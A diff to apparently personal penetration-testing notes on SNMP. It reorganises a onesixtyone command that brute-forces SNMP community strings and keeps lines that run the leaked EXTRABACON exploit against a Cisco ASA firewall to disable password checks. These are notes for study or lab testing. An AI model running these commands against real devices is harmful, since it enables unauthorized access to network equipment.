@@ -28,6 +28,11 @@ Steps-
 * Get SNMP IP from Wireshark 
 * Use snmpcheck -t IP
 
+**Cracking SNMP community strings( if not set to "public") and **
+
+	kali > onesixtyone 192.168.1.102 -c /usr/share/doc/onesixtyone/dict.txt
+
+
 
 #### Zero Day :[NSA Exploit in CISCO ASA]( https://www.hackers-arise.com/post/2016/08/22/the-extrabacon-zero-day-exploit-on-cisco-asa-firewalls)
 
@@ -41,10 +46,8 @@ This exploit requires;
 
 Note : The EXTRABACON exploit is a python script that you can [download here](https://github.com/blahdidbert/extrabacon).
 
-**Cracking SNMP community strings( if not set to "public") and using Extrabacon:  **
-	
-	kali > onesixtyone 192.168.1.102 -c /usr/share/doc/onesixtyone/dict.txt
-	
+**Using Extrabacon:  **
+		
 	kali > ./extrabacon info -t 192.168.1.101 -c hackers-arise
 		This will return a file that we need in exec mode of EXTRABACON. Here, I have named that file OTW
 	kali > ./extrabacon_1.1.0.1.py exec -k OTW -t 192.168.1.101 -c hackers-arise --mode pass-enable
